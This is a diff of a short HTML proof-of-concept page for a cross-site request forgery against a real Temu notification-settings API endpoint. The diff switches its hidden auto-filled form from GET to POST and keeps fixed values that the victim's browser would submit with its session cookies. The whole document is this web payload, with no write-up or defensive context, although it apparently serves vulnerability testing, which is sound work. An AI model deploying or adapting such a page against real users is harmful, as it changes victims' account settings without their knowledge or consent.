@@ -2,17 +2,17 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Temu CSRF PoC - Manual Submit</title>
+  <title>Temu CSRF PoC - POST</title>
 </head>
 <body>
-  <h2>Temu CSRF PoC - Trigger GET Request</h2>
+  <h2>Temu CSRF PoC - Manual POST Submit</h2>
 
-  <form action="https://www.temu.com/api/bg-barbera-api/setting/notification/configure" method="GET" target="_blank">
+  <form action="https://www.temu.com/api/bg-barbera-api/setting/notification/configure" method="POST" target="_blank">
     <input type="hidden" name="id" value="100">
     <input type="hidden" name="status" value="1">
-    <button type="submit">Submit CSRF GET Request</button>
+    <button type="submit">Submit CSRF POST Request</button>
   </form>
 
-  <p>Click the button above to manually trigger the GET request with cookies included (if browser allows).</p>
+  <p>This form will send a POST request with form-encoded data. Cookies will be included if browser allows it.</p>
 </body>
 </html>
